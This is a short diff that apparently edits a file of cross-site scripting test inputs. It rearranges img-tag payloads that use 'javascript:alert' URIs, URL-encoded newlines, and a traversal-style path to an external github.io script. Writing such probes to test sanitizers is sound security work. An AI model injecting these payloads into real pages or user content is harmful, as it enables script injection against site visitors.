@@ -1,6 +1,6 @@
 ![
-
-<img %0a color="../../../../../../../img/onload/../../\github.com/r89shi/r89shi.github.io/blob/master/teste.js" alt="javascript:alert(1)"/>
+%0a
+<img color="../../../../../../../img/onload/../../\github.com/r89shi/r89shi.github.io/blob/master/teste.js" alt="javascript:alert(1)"/>
 
 <IMG SRC= color=javascript%3aalert(&quot;XSS&quot;) >
   
